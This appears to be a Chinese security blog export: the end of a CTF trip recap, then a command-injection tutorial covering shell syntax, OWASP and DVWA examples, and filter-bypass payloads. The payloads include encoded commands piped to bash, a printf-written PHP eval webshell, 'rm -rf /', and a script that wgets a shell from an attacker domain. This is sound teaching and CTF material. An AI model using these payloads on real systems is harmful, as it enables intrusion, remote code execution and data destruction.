不过后来我写到plainview-activity-monitor插件漏洞利用的时候，发现这个利用条件需要登录到后台，我猜想这里增加管理员以及盲注漏洞都是为了那个插件的RCE漏洞准备的吧。 总结吐槽这次比赛收获还是有的。只不过不给连外网比较坑，而且解题赛放题时间也不合理，Web最后两道题都是最后一小时才放的，而且考的phpjm也比较坑…而且Misc估计是这场比赛最大的槽点了，我没有从头到尾都在做Misc，但是两个Misc，都是靠爆破出来的zip压缩包密码，跟之前题目提示的密码呀什么的完全没有关系，我记得其中一个密码是q，另一个密码是与给出的密码暗示0x120完全不一样的0x110…这里坑了我们很久… AWD就不想评价了，pwn只攻不防，赛后听说可以通过在自己的pwn服务上打forkbomb躲过其他队的攻击。整个比赛可以说是没有任何 check，主办方对get flag的方式也没有做详细说明，也听说有个队最后一小时才知道怎么get flag。平台卡的一批…公告还说不能用脚本提交flag，哎。到处都是槽点。感觉主办方准备的不是很充分。 自我反省同时本次比赛，从技术的角度来看，主要在AWD方面，我感觉自己准备的还是不够充分，即使给了payload，我也没有第一时间利用起来去得分，导致自己丢了很多很多分数。主要也是自己对python没有足够的熟悉吧，被requests库自动urlencode坑了比较久。虽然收藏了几个大师傅的AWD工具框架，但是没有熟悉利用，以至于赛场都是自己现写的脚本，并没有将准备的脚本利用起来。 下次线下赛必备的脚本，其一是自动提交flag，主要是正则那里；其二是get flag的脚本，依据目前主流的攻防形式，要准备两类，一类是flag以文件的形式存放在选手机器上的，另一类就是在选手机器上通过curl请求得到flag的，目前我打过的比赛就分为这两类。 今晚还看了白帽100湖湘杯线下赛的记录，感觉自己的对于线下赛的理解还是不够深刻。打算有空更一篇AWD的个人总结。本次小记就这样吧。","link":"/2018/11/25/%E5%8E%A6%E5%A4%A7%E6%97%85%E6%B8%B8%E5%B0%8F%E8%AE%B0/"},{"title":"巧用命令注入的N种方式","text":"​ 本文首发于补天平台，地址：https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw 在NUAACTF_2018中，我出了一道比较水的采用Spring框架的SSRF+Java Deserialization+Command Injection。个人觉得在出题时候也学习到了不少知识，特别是在Command Injection这一块让我对Command Injection有了新的看法。 命令执行理论基础 Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation. This attack differs from Code Injection, in that code injection allows the attacker to add his own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code. 以上来自Command Injection - OWASP，翻译过来就是通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供的数据（表单，cookie，HTTP标头等）传递给系统shell时，可能会发生命令注入攻击。 在此攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的权限执行。 命令注入攻击很可能主要是由于输入验证不足。此攻击与代码注入不同，因为代码注入允许攻击者添加自己的代码，然后由应用程序执行。 在命令注入中，攻击者扩展了执行系统命令的应用程序的默认功能，而无需注入代码。 ​ 命令注入攻击最初被称为Shell命令注入攻击，是由挪威一名程序员在1997年意外发现的。第一个命令注入攻击程序能随意地从一个网站删除网页，就像从磁盘或者硬盘移除文件一样简单。 ——百度百科 特殊符号讲到命令注入，就不得不提到特殊符号的运用。例如上面例子中的|管道符，还有比较多的类似有奇效的符号组合。 |连结上个指令的标准输出，做为下个指令的标准输入。 &amp;用户有时候执行命令要花很长时间，可能会影响做其他事情。最好的方法是将它放在后台执行。后台运行的程序在用户注销后系统还可以继续执行。当要把命令放在后台执行时，在命令的后面加上&amp;。 Linux中的&amp;&amp;与||shell在执行某个命令的时候，会返回一个返回值，该返回值保存在shell变量 $? 中。当 $? == 0 时，表示执行成功；当 $? == 1 时，表示执行失败。有时候，下一条命令依赖前一条命令是否执行成功。如：在成功地执行一条命令之后再执行另一条命令，或者在一条命令执行失败后再执行另一条命令等。shell提供了&amp;&amp;和||来实现命令执行控制的功能，shell将根据&amp;&amp;或||前面命令的返回值来控制其后面命令的执行。 &amp;&amp;语法格式如下： command1 &amp;&amp; command2 [&amp;&amp; command3 ...] 命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。 只有在&amp;&amp;左边的命令返回真（命令返回值 $? == 0），&amp;&amp;右边的命令才会被执行 只要有一个命令返回假（命令返回值 $? == 1），后面的命令就不会被执行 1$ cp ~/Desktop/1.txt ~/1.txt &amp;&amp; rm ~/Desktop/1.txt &amp;&amp; echo \"success\" 示例 中的命令首先从~/Desktop目录复制 1.txt文件到~目录；执行成功后，使用rm删除源文件；如果删除成功则输出提示信息。 ||语法格式如下： command1 || command2 [|| command3 ...] 命令之间使用 || 连接，实现逻辑或的功能。 只有在 || 左边的命令返回假（命令返回值 $? == 1），||右边的命令才会被执行。这和c语言中的逻辑或语法功能相同，即实现短路逻辑或操作。 只要有一个命令返回真（命令返回值 $? == 0），后面的命令就不会被执行。 1$ rm ~/Desktop/1.txt || echo \"fail\" 如果 ~/Desktop 目录下不存在文件 1.txt，将输出提示信息。 ;分号当有几个命令要连续执行时，我们可以把它们放在一行内，中间用;分开。 `反引号（重音符）命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。例如以下指令: 1234567echo It is now `date` 等价于：echo It is now 一 12月 17 12:16:04 GMT 2018在正式执行时会产生以下输出结果：It is now 一 12月 17 12:16:04 GMT 2018 ‘单引号被单引号括住的内容,将被视为单一字符串。在引号内的变量$符号将会失效，也就是说，将被视作一般符号处理。 “双引号被双引号括住的内容，将被视为单一字符串，防止通配符的扩展，但允许变量扩展 ，这点与单引号的处理方式不同 ()指令群组格式为：(command1;command2[;command3…]) 一条命令需要独占一个物理行，如果需要将多条命令放在同一行，命令之间使用命令分隔符（;）分隔。执行的效果等同于多个独立的命令单独执行的效果。 表示在当前 shell 中将多个命令作为一个整体执行。需要注意的是，使用 () 括起来的命令在执行前面都不会切换当前工作目录，也就是说命令组合都是在当前工作目录下被执行的，尽管命令中有切换目录的命令。 命令组合常和命令执行控制结合起来使用。 用括号将一串连续指令括起来，这种用法对shell来说，称为指令群组。如下面的例子: 1(cd ~ ; vcgh=`pwd` ;echo $vcgh) 指令群组有一个特性，shell会以产生subshell来执行这组指令。 123$ rm ~/Desktop/1.txt || (cd ~/Desktop/;ls -a;echo \"fail\") 如果目录 ~/Desktop 下不存在文件 1.txt，则执行命令组合。 (())这组符号的作用与 let 指令相似，用在算数运算上，是 bash 的内建功能。所以，在执行效率上会比使用 let指令要好许多。 1#!/bin/bash(( a = 10 ))echo -e \"inital value, a = $a\\n\"(( a++))echo \"after a++, a = $a\" {}大括号其实大括号有一种拼接字符串的用法，{xx,yy,zz,...}这种大括号的组合，常用在字串的组合上，来看个例子 1mkdir {userA,userB,userC}-{home,bin,data} 我们得到userA-home, userA-bin, userA-data, userB-home, userB-bin,userB-data, userC-home, userC-bin,userC-data。于是我们可以有 12345$ cat {/fl,/fla}{ag,g}flag{xxx}cat: /flg: No such file or directorycat: /flaag: No such file or directoryflag{xxx} []中括号常出现在流程控制中，扮演括住判断式的作用。if [ \"$?\" != 0 ]thenecho \"Executes error\"exit1fi。这个符号在正则表达式中担任类似 “范围” 或 “集合” 的角色。 12$ cat /fl[0-z]gflag{xxx} [[ ]]这组符号与先前的[] 符号，基本上作用相同，但她允许在其中直接使用||与&amp;&amp;逻辑等符号。 1#!/bin/bashread akif [[ $ak &gt; 5 || $ak&lt; 9 ]]thenecho $akfi 小括号，中括号，和大括号的区别那么，下面又涉及到了一个问题，就是小括号，中括号，和大括号的区别。 单小括号，(cmd1;cmd2;cmd3) 新开一个子shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后可以没有分号。把command group放在subshell去执行，也叫做nested sub-shell。 单大括号，{ cmd1;cmd2;cmd3;} 在当前shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后必须有分号, 第一条命令和左括号之间必须用空格隔开。花括号是在同一个 shell 內完成，也称为 non-namedcommand group。 所以说，如果在shell里面执行“函数”，需要用到{}，实际上也就是一个命令群组么。不过，根据实测，test=$(ls -a)可以执行，但是test=${ls–a}语法上面是有错误的。估计也和上面所说的原因有关。 另外，从网上摘录的区别如下： ()只是对一串命令重新开一个子shell进行执行 {}对一串命令在当前shell执行 ()和{}都是把一串的命令放在括号里面，并且命令之间用;号隔开 ()最后一个命令可以不用分号 {}最后一个命令要用分号 {}的第一个命令和左括号之间必须要有一个空格 ()里的各命令不必和括号有空格 ()和{}中括号里面的某个命令的重定向只影响该命令，但括号外的重定向则影响到括号里的所有命令 这里引出来[..]和[[...]]的区别：使用[[...]]条件判断结构, 而不是[...], 能够防止脚本中的许多逻辑错误.比如&amp;&amp;,||,&lt;,和&gt; 操作符能够正常存在于[[ ]]条件判断结构中, 但是如果出现在[]结构中的话，会报错。 对{}和()而言, 括号中的重定向符只影响该条命令， 而括号外的重定向符影响到括号中的所有命令。 输入输出/重定向1&gt; &gt;&gt; &lt; &lt;&lt; :&gt; &amp;&gt; 2&amp;&gt; 2&lt;&gt;&gt;&amp; &gt;&amp;2 文件描述符(File Descriptor)，用一个数字（通常为0-9）来表示一个文件。 文件描述符 名称 常用缩写 默认值 0 标准输入 stdin 键盘 1 标准输出 stdout 屏幕 2 标准错误输出 stderr 屏幕 我们在简单地用&lt;或&gt;时，相当于使用0&lt;或1&gt;（下面会详细介绍）。 cmd &gt; file把cmd命令的输出重定向到文件file中。如果file已经存在，则清空原有文件，使用bash的noclobber选项可以防止复盖原有文件。 cmd &gt;&gt; file把cmd命令的输出重定向到文件file中，如果file已经存在，则把信息加在原有文件后面。 cmd &lt; file使cmd命令从file读入 cmd &lt;&lt; text从命令行读取输入，直到一个与text相同的行结束。除非使用引号把输入括起来，此模式将对输入内容进行shell变量替换。如果使用&lt;&lt;- ，则会忽略接下来输入行首的tab，结束行也可以是一堆tab再加上一个与text相同的内容，可以参考後面的例子。 cmd &lt;&lt;&lt; word把word（而不是文件word）和后面的换行作为输入提供给cmd。 cmd &lt;&gt; file以读写模式把文件file重定向到输入，文件file不会被破坏。仅当应用程序利用了这一特性时，它才是有意义的。 cmd &gt;| file功能同&gt;，但即便在设置了noclobber时也会复盖file文件，注意用的是|而非一些书中说的!，目前仅在csh中仍沿用&gt;!实现这一功能。 : &gt; filename 把文件filename截断为0长度。如果文件不存在, 那么就创建一个0长度的文件(与touch的效果相同). cmd &gt;&amp;n 把输出送到文件描述符n cmd m&gt;&amp;n 把输出到文件符m的信息重定向到文件描述符n cmd &gt;&amp;- 关闭标准输出 cmd &lt;&amp;n 输入来自文件描述符n cmd m&lt;&amp;n m来自文件描述各个n cmd &lt;&amp;- 关闭标准输入 cmd &lt;&amp;n- 移动输入文件描述符n而非复制它。 cmd &gt;&amp;n- 移动输出文件描述符n而非复制它。注意： &gt;&amp;实际上复制了文件描述符，这使得cmd &gt; file 2&gt;&amp;1与cmd 2&gt;&amp;1 &gt;file的效果不一样。 通配符还有一类通配符，首先先了解下什么是Linux shell通配符/glob模式: glob 模式（globbing）也被称之为 shell 通配符，名字的起源来自于 Unix V6 中的 /etc/glob （详见 man 文档）。glob 是一种特殊的模式匹配，最常见的是通配符拓展，也可以将 glob 模式设为精简了的正则表达式，在最新的 CentOS 7 中已经删除了 glob 的相关描述文档，删除的原因由于 glob 已经整合到了 shell 之中，然后就有了 shell 通配符。shell 通配符 / glob 模式通常用来匹配目录以及文件，而不是文本！！！ 语法 字符 解释 * 匹配任意长度任意字符 ? 匹配任意单个字符 [list] 匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合 [^list] 匹配指定范围外的任意单个字符或字符集合 [!list] 同[^list] {str1,str2,…} 匹配 srt1 或者 srt2 或者更多字符串，也可以是集合 IFS 由 &lt; space &gt; 或 &lt; tab &gt; 或 &lt; enter &gt; 三者之一组成 CR 由 &lt; enter &gt; 产生 ! 执行 history 中的命令 以及还有专用字符集 字符 意义 [:alnum:] 任意数字或者字母 [:alpha:] 任意字母 [:space:] 空格 [:lower:] 小写字母 [:digit:] 任意数字 [:upper:] 任意大写字母 [:cntrl:] 控制符 [:graph:] 图形 [:print:] 可打印字符 [:punct:] 标点符号 [:xdigit:] 十六进制数 [:blank:] 空白字符 在使用专属字符集的时候，字符集之外还需要用 [ ] 来包含住，否则专用字符集不会生效，例如[[:space:]] 想要转义的时候，单引号与双引号使用方法是不同的，单引号会转义所有字符，而且单引号中间不允许再出现单引号，双引号允许出现特定的 shell 元字符，具体字符可以自行查询 在使用花括号 {} 的时候，里面的单个字符串需要使用单引号或者双引号括住，否则就会视为多个的单个字符 举个例子以下事例Example 1-6来源于OWASP Example 1以下代码是UNIX命令cat的包装器，它将文件的内容打印到标准输出。 它也是可以被注入的： 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main(int argc, char **argv) { char cat[] = \"cat \"; char *command; size_t commandLength; commandLength = strlen(cat) + strlen(argv[1]) + 1; command = (char *) malloc(commandLength); strncpy(command, cat, commandLength); strncat(command, argv[1], (commandLength - strlen(cat)) ); system(command); return (0);} 我们编译完之后可以通过以下操作正常使用 12$ ./catWrapper Story.txtWhen last we left our heroes... 但是，如果我们在这行的末尾之后加一个;和另一个命令，那么命令catWrapper执行而且也不会出错。 1234567$ ./catWrapper \"Story.txt; ls\"When last we left our heroes...Story.txt doubFree.c nullpointer.cunstosig.c www* a.out*format.c strlen.c useFree*catWrapper* misnull.c strlength.c useFree.ccommandinjection.c nodefault.c trunc.c writeWhatWhere.c 如果将catWrapper设置为具有比标准用户更高的权限级别，则可以使用该更高权限执行任意命令。 Example 2以下简单程序接受文件名作为命令行参数，并将文件的内容显示给用户。 该程序安装了setuid root，假设原本它旨在用作学习工具，允许系统管理员在培训中检查特权系统文件，而不会让他们修改它们或损坏系统。 12345int main(char* argc, char** argv) { char cmd[CMD_MAX] = \"/usr/bin/cat \"; strcat(cmd, argv[1]); system(cmd);} 由于程序以root权限运行，因此对system()的调用也以root权限执行。 如果用户指定标准文件名，则程序调用会按预期工作。 但是，如果攻击者传递1; rm -rf /形式的字符串，无论当前目录是否有1这个文件，都会继续向下执行rm -rf /。 Example 3本例中，本程序拥有对应的权限，使用环境变量$APPHOME来确定应用程序的安装目录，然后在该目录中执行初始化脚本 1234567char* home=getenv(\"APPHOME\");char* cmd=(char*)malloc(strlen(home)+strlen(INITCMD));if (cmd) { strcpy(cmd,home); strcat(cmd,INITCMD); execl(cmd, NULL);} 本例前提与Example 2中一样，此示例中的代码允许攻击者使用应用程序的提升权限执行任意命令。在此示例中，攻击者可以修改环境变量$APPHOME通过制定不同的路径以使用含有恶意代码的INITCMD。 由于程序不验证从getenv()读取的值，因此通过控制环境变量，攻击者可以欺骗应用程序运行恶意代码。 攻击者使用环境变量来控制程序调用的命令，因此在此示例中环境变量的影响是非常巨大的。 Example 4下面的代码来自基于Web的CGI实用程序，允许用户更改其密码。 NIS下的密码更新过程包括在/var/yp目录中运行make。 请注意，由于程序更新密码记录，因此已安装setuid root。函数对make调用如下： 1system(\"cd /var/yp &amp;&amp; make &amp;&gt; /dev/null\"); 与前面的示例不同，此示例中的命令是没有可控输入的硬编码，因此攻击者无法控制传递给system()的参数。但是，由于程序没有为make指定绝对路径，并且在调用命令之前没有擦除任何环境变量，因此攻击者可以修改其$PATH变量以指向名为make的恶意二进制文件，并从中执行CGI脚本。shell提示。由于该程序已经安装了setuid root，因此攻击者的make版本现在以root权限运行。 环境在程序中执行系统命令方面发挥着重要作用。system()和exec()之类的函数使用调用它们的程序环境，因此攻击者有可能影响这些调用的行为。 有很多文章会提到Java的Runtime.exec与C的系统功能完全相同。其实不然。虽然两者都允许调用新的程序/进程，但是，C的系统函数将其参数传递给要解析的shell(/bin/sh)，而Runtime.exec尝试将字符串拆分为单词数组，然后使用其余单词执行数组中的第一个单词作为参数。Runtime.exec不会尝试在任何时候调用shell。关键的区别在于shell提供的大部分功能可被恶意利用的点（例如＆，&amp;&amp;，|，||等链接命令，重定向输入和输出）将简单地结束作为传递给第一个命令的参数，可能导致语法错误，或被抛出作为无效参数。 Example 5以下简单的代码片段易受Unix/Linux平台上的OS命令注入攻击： 123456789101112131415161718192021#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv){ char command[256]; if(argc != 2) { printf(\"Error: Please enter a program to time!\\n\"); return -1; } memset(&amp;command, 0, sizeof(command)); strcat(command, \"time ./\"); strcat(command, argv[1]); system(command); return 0;} 如果这是一个suid二进制文件，请考虑攻击者输入以下内容的情况:ls; cat /etc/passwd。 在Unix环境中，shell命令用分号分隔。 我们现在可以随意执行系统命令！ Example 6123456&lt;?php print(\"Please specify the name of the file to delete\"); print(\"&lt;p&gt;\"); $file=$_GET['filename']; system(\"rm $file\");?&gt; 以下成功攻击的示例： Request: 1http://127.0.0.1/delete.php?filename=bob.txt;id Response: 123Please specify the name of the file to deleteuid=33(www-data) gid=33(www-data) groups=33(www-data) 再举个例子?的使用12345678910111213141516171819202122232425$ cat /fl??NUAACTF{56723419231}$ cat /???/??ssdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin_apt:x:102:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:103:107:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin […]的使用[...]匹配方括号之中的任意一个字符，比如[aeiou]可以匹配五个元音字母。 123456789101112# 存在文件 a.txt 和 b.txt 和 c.txt 和 ab.txt$ ls [ab].txta.txt b.txt$ ls *[ab].txtab.txt a.txt b.txt$ ls [a-c].txta.txt b.txt c.txt$ ls *[a-c].txta.txt ab.txt abc.txt b.txt c.txt {…}的使用{...} 表示匹配大括号里面的所有模式，模式之间使用逗号分隔。 12345678910$ echo d{a,e,i,u,o}gdag deg dig dug dog# 大括号可以嵌套使用$ echo {j{p,pe}g,png}jpg jpeg png# {start..end}匹配连续字符$ cat /f{0..z}agNUAACTF{56723419231} {...}与[...]有一个很重要的区别。如果匹配的文件不存在，[...]会失去模式的功能，变成一个单纯的字符串，而{...}依然可以展开。 1234567# 不存在 a.txt 和 b.txt$ ls [ab].txtls: [ab].txt: No such file or directory$ ls {a,b}.txtls: a.txt: No such file or directoryls: b.txt: No such file or directory Tips在使用过程中应该注意： 通配符是先解释，再执行。 Bash 接收到命令以后，发现里面有通配符，会进行通配符扩展，然后再执行命令。 1234$ ls a*.txtab.txt# 上面命令的执行过程是，Bash 先将a*.txt扩展成ab.txt，然后再执行ls ab.txt。 通配符不匹配，会原样输出。 Bash 扩展通配符的时候，发现不存在匹配的文件，会将通配符原样输出。 1234$ ls *.csvls: *.csv: No such file or directory# 另外，前面已经说过，这条规则对{...}不适用 只适用于单层路径。 上面所有通配符只匹配单层路径，不能跨目录匹配，即无法匹配子目录里面的文件。或者说，?或*这样的通配符，不能匹配路径分隔符（/）。 如果要匹配子目录里面的文件，可以写成下面这样。 1$ ls */*.txt 可用于文件名。 Bash 允许文件名使用通配符。这时，引用文件名的时候，需要把文件名放在单引号里面。 12345$ touch 'fo*'$ lsfo*# 上面代码创建了一个fo*文件，这时*就是文件名的一部分。 运用以DVWA为例 Command Injection: low123456789101112131415161718192021&lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"&lt;pre&gt;{$cmd}&lt;/pre&gt;\"; } ?&gt; 这里没有对ip进行输入检测，所以我们可以使用;cmd的方式进行命令注入。 ####Command Injection: medium 123456789101112131415161718192021222324252627282930&lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Set blacklist $substitutions = array( '&amp;&amp;' =&gt; '', ';' =&gt; '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"&lt;pre&gt;{$cmd}&lt;/pre&gt;\"; } ?&gt; 这里仅仅只是增加了&amp;&amp;与;两个的过滤。然而我们仍然可以使用|来进行绕过。 ####Command Injection: high 12345678910111213141516171819202122232425262728293031323334353637&lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = trim($_REQUEST[ 'ip' ]); // Set blacklist $substitutions = array( '&amp;' =&gt; '', ';' =&gt; '', '| ' =&gt; '', '-' =&gt; '', '$' =&gt; '', '(' =&gt; '', ')' =&gt; '', '`' =&gt; '', '||' =&gt; '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"&lt;pre&gt;{$cmd}&lt;/pre&gt;\"; } ?&gt; 这里仔细观察，其实|管道符这里有一个空格，所以我们medium的payload还可以继续使用，但是如果真的过滤了|怎么办呢。我们其实还可以抓包加入%0a换行符进行一个绕过。使用127.0.0.1 %0acat /etc/passwd进行绕过 Command Injection: impossible1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $target = $_REQUEST[ 'ip' ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( \".\", $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int's put the IP back together. $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"&lt;pre&gt;{$cmd}&lt;/pre&gt;\"; } else { // Ops. Let the user name theres a mistake echo '&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 这里对ip以.分组并检查了是否为数字，增加了更多的过滤，所以没办法使用之前那些trick来进行绕过了。 常用绕过命令分隔与执行多条命令在Unix上: 12345678%0a%0d ;&amp;|$(shell_command)`shell_command`{shell_command,} 在Windows上： 1234%0a&amp;|%1a - 一个神奇的角色，作为.bat文件中的命令分隔符 例如： 1234567&lt;?php$command = 'dir '.$_POST['dir'];$escaped_command = escapeshellcmd($command);var_dump($escaped_command);file_put_contents('out.bat',$escaped_command);system('out.bat');?&gt; 可以利用%1a绕过 1dir=../ %1a whoami 比较老的php版本，如5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。 123escapeshellcmd(\"echo \".chr(0xc0).\";id\");//echo 繺;id 空格绕过 使用&lt;或者&lt;&gt; 12345$ cat&lt;/flagflag{xxx}$ cat&lt;&gt;/flagflag{xxx} 使用IFS或者 12345678$ cat$IFS$9/flagflag{xxx}$ cat${IFS}/flagflag{xxx}$ cat$IFS/flagflag{xxx} 在url的编码绕过 这里我fuzz了一下，Linux bash可以使用%20(space)、%09(tab)、%3c(&lt;)以及+来绕过 花括号拓展{OS_COMMAND,ARGUMENT} 在Linux bash中还可以使用{cat,/etc/passwd}来绕过 变量控制 1234567$ X=$'cat\\x20/flag'&amp;&amp;$Xflag{xxx}$ X=$'cat\\x09/flag'&amp;&amp;$Xflag{xxx}#这里\\x3c不可以 采用$@绕过 12345678$ c$@at /fl$@agflag{xxx}$ echo i$@did$ echo i$@d|$0uid=0(root) gid=0(root) groups=0(root) 黑名单绕过 采用变量 12345$ a=l;b=s;$a$bbin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var$ a=c;b=at;c=flag;$a$b $cflag{xxx} 编码绕过 1234567891011121314151617181920212223$ echo \"Y2F0IC9mbGFn\"|base64 -d|bashflag{xxx}#base64_endcode(\"cat /flag\") =&gt; Y2F0IC9mbGFn#base64可能会出现/$ echo \"636174202f666c6167\" | xxd -r -p|bash #hexflag{xxx}$ $(printf \"\\154\\163\") #octbin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var$ $(cat /flag)bash: flag{xxx}: 未找到命令$ $(printf \"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\")flag{xxx}$ {printf,\"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\"}|$0flag{xxx}#可以通过这样来写webshell,内容为&lt;?php @eval($_POST['c']);?&gt;$ {printf,\"\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76\"} &gt;&gt; 1.php 单引号双引号 12$ c\"a\"t /f''l'a'gflag{xxx} 反斜线 12$ c\\a\\t /f\\l\\agflag{xxx} 利用已经存在的资源 12345$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin$ echo $PATH| cut -c 1/ 利用一些已有字符 ${PS2} 对应字符 &gt; ${PS4} 对应字符 + ${IFS} 对应 内部字段分隔符 ${9} 对应 空字符串 举个例子短命令执行首先按照前面的&gt;的用法，我们可以知道有标准输出可以输出到文件，所以 这里我们有两种构造方式: 只用\\分行输入，这个优点是可以不用考虑时间顺序，直接用ls&gt;a输出到a文件，这里可能有一点误解，这里是输入 1234$ &gt;ec\\ho\\\\ 1#这个方法前面不需要加&gt;，最后用\\转义空格 使用\\\\，这种方法是利用\\来拼接字符串，其中前一个\\是用来转义后一个\\的。这里需要考虑时间顺序，需要逆序来创建文件。 Example 1 七字绕过这里是个p牛出的题 12345&lt;?phpif(strlen($_GET[1])&lt;8){ echo shell_exec($_GET[1]);}?&gt; 我们可以分别通过发送 12345678910?1=&gt;hp?1=&gt;ell.p\\\\?1=&gt;\\ sh\\\\?1=&gt;\\ -O\\\\?1=&gt;com\\\\?1=&gt;x.\\\\?1=&gt;\\ xx\\\\?1=&gt;wget\\\\?1=ls -t&gt;a?1=sh a 也就是我们上述的第二个方法写入一个a文件，其中xxx.com可以替换为自己的域名，但是这里要注意，不能以.开头，因为ls -t&gt;a无法将隐藏文件名写入a。 贴一下p牛的脚本 1234567891011121314151617181920212223242526272829303132#!/usr/bin/python3#-*- coding: utf-8 -*- import requests def GetShell(): url = \"http://192.168.56.129/shell.php?1=\" fileNames = [\"1.php\",\"-O\\ \\\\\",\"cn\\ \\\\\",\"\\ a.\\\\\",\"wget\\\\\"] # linux创建中间有空格的文件名，需要转义，所以有请求\"cn\\ \\\\\" # 可以修改hosts文件，让a.cn指向一个自己的服务器。 # 在a.cn 的根目录下创建index.html ，内容是一个php shell for fileName in fileNames: createFileUrl = url+\"&gt;\"+fileName print createFileUrl requests.get(createFileUrl) getShUrl = url + \"ls -t&gt;1\" print getShUrl requests.get(getShUrl) getShellUrl = url + \"sh 1\" print getShellUrl requests.get(getShellUrl) shellUrl = \"http://192.168.56.129/1.php\" response = requests.get(shellUrl) if response.status_code == 200: print \"[*] Get shell !\" else : print \"[*] fail!\" if __name__ == \"__main__\": GetShell() Example 2 五字绕过 [HITCON CTF 2017-BabyFirst Revenge]源码: 12345678910&lt;?php $sandbox = '/www/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf ' . $sandbox); } highlight_file(__FILE__); 这里需要我们注意的是cmd &lt;= 5，所以我们就不能在使用ls -t&gt;a。 但是我们还是可以通过比较巧妙的构造来实现ls -t&gt;a这么一个操作的。可以先通过把ls -t&gt;a这样拆分成几段写入到_文件存放。 